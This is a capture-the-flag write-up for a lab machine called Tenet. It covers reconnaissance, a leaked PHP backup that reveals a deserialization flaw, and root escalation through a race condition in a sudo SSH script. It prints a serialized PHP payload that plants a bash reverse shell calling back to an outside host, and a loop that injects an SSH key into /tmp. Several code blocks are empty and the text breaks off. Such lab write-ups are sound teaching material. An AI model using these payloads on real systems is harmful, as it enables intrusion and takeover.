I started by doing a scan with *Nmap* of the ports and services that the machine has open.

```bash

``` 

It has two ports open, the first one is for SSH and the second is a web server that runs on its default port, I did another scan to see the version of each service.

```bash

**Nmap** reported that I was facing a **WordPress**, I wanted to verify that, so I used "WhatWeb".

```bash
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ whatweb http://10.10.10.223/

```

"WhatWeb" did not report it to me, but it was indeed a WordPress, I also did a "Fuzzing" with "Gobuster" to see if I could find any potential directories.

```bash
┌─[root@parrot]─[/home/wackyhacker/Desktop]

I was able to confirm that it was a WordPress, I went to the page to see what was there.

It seems that "Virtual Hosting" was being applied and it was not pointing to the domain that the host is hosting, look at the source code and **tenet.htb** is the domain that the host was pointing from.

I just included it in */etc/hosts* to point to the host and be able to see what I had.

Now I could see what it really contained.

I found a potential user.

I wanted to try it in WordPress since it allows you to enumerate users.

![Captura de pantalla (557)](https://user-images.githubusercontent.com/69093629/121810121-d73d2480-cc5f-11eb-8d43-8f2577c303a7.png)

The user was valid, I thought about using brute force, but I wanted to investigate the page further, I also saw this comment that caught my attention.

![Screenshot (525)](https://user-images.githubusercontent.com/69093629/121810193-1ec3b080-cc60-11eb-9e2b-5cf7e51df2ec.png)

Trying different things, I came to the conclusion that **sator** is a subdomain of **tenet.htb**, I included it in */etc/hosts*.

![Screenshot (558)](https://user-images.githubusercontent.com/69093629/121810525-84fd0300-cc61-11eb-9ae0-81f2499e2876.png)

In the comment I also mentioned something about PHP along with sator, I tried to join them and see if it was a PHP file, apparently it was, this is what I had.

![Screenshot (559)](https://user-images.githubusercontent.com/69093629/121810575-c097cd00-cc61-11eb-9343-1315250f0b4e.png)

The comment was talking about a "backup", so I decided to try adding a **.bak** to the **sator.php** file and it downloaded a file.

![Screenshot (560)](https://user-images.githubusercontent.com/69093629/121810801-7cf19300-cc62-11eb-8b51-214000faa57a.png)

I made a cat to see its contents.

![Screenshot (561)](https://user-images.githubusercontent.com/69093629/121810890-c4781f00-cc62-11eb-858a-9d3d04939eb0.png)

Apparently it was the source code of **sator.php**, this was going to allow me to rather plan the next step of the intrusion, what the code does is receive an input from the arepo parameter and deserializes it, this was an insecure deserialization attack by *PHP* like a house, now what I had to do was create the serialized malicious code so that in the deserialization it executes my malicious statement in *PHP*, in this case a reverse shell by netcat.

This is the PHP code I used for serialization.

```php
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ php --interactive
php > class DatabaseExport {
php > public $user_file = 'shell.php';
php > public $data = '<?php shell_exec("bash -c \'bash -i >& /dev/tcp/10.10.16.5/443 0>&1\'"); ?>'; }
php > print urlencode(serialize(new DatabaseExport));
```

Once serialized I introduced it into the "arepo" input (**http://10.10.10.223/sator.php?arepo={serialize_code}**)

And I gave myself a shell via netcat.

![Screenshot (563)](https://user-images.githubusercontent.com/69093629/121811527-fe4a2500-cc64-11eb-9b57-35ba4ddc8005.png)

I did a TTY treatment and tried to view the "user" flag but I didn't have permissions, I had to become the user neil.

![Screenshot (568)](https://user-images.githubusercontent.com/69093629/121811909-330aac00-cc66-11eb-8df0-6212cfa8fb17.png)

I remembered I was dealing with a WordPress, so I found and viewed its configuration file which contains the password.

![Screenshot (566)](https://user-images.githubusercontent.com/69093629/121811799-c2638f80-cc65-11eb-8424-6a3229250d21.png)

I tried authenticating as neil and it worked.

<hr>
<h1 align="center"><b>ESCALADA DE PRIVILEGIOS</b></h1>

I looked at the "flag", now all that was missing was the privilege escalation, I did a ```sudo -l``` to see if something could be executed as the ROOT user and I found a script.

![Screenshot (569)](https://user-images.githubusercontent.com/69093629/121812543-867df980-cc68-11eb-8464-ef7c9e43149e.png)

I catned the absolute path with ```xargs``` to see what it did.

![Screenshot (570)](https://user-images.githubusercontent.com/69093629/121812621-cba22b80-cc68-11eb-9977-c543435c1d0d.png)

What the script does is create an **id_rsa.pub** key and host it in */tmp/ssh-{**XXXXX**}->*(**random characters**) and then copy the contents of the file to **known_hosts**. If we have the ability to include our public key in */tmp* before it is copied to **known_hosts** we can start SSH as the ROOT user. To do this I used the following command in a window authenticated in SSH as the user neil.

```bash
neil@tenet~$ while true; do echo "{SSH_PUBLIC} | tee /tmp/ssh* > /dev/null; done"
```

And in another window with SSH as the user neil I gave the script execute permissions and ran it recursively a few times.

```bash
neil@tenet~$ sudo ./usr/local/bin/enableSSH.sh
```

and...
